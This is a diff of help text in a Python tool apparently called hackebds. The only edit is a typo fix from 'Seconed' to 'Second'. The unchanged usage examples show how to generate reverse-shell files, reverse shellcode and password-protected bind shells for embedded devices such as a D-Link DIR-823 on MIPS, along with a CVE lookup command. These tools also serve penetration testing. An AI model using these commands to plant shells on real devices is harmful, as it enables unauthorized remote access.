@@ -2823,15 +2823,15 @@ def main():
 example
 	Generate reverse_shell_file Corresponding architecture:
 	Once:    hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -arch mips -model DIR-823 -res reverse_shell_file 
-	Seconed: hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -model DIR-823 -res reverse_shell_file 
+	Second: hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -model DIR-823 -res reverse_shell_file 
 
 	Generate reverse_shellcode Corresponding architecture:
 	Once:    hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -arch mips -model DIR-823 -res reverse_shellcode
-	Seconed: hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -model DIR-823 -res reverse_shellcode
+	Second: hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -model DIR-823 -res reverse_shellcode
 
 	Generate bind_shell Corresponding architecture:
 	Once:    hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
-	Seconed: hackebds -bind_port 8080 -passwd 1234  -model DIR-823 -res bind_shell
+	Second: hackebds -bind_port 8080 -passwd 1234  -model DIR-823 -res bind_shell
 
 	model for CVE info(Online or localfile):
 	hackebds -model DIR-823 -res cveinfo
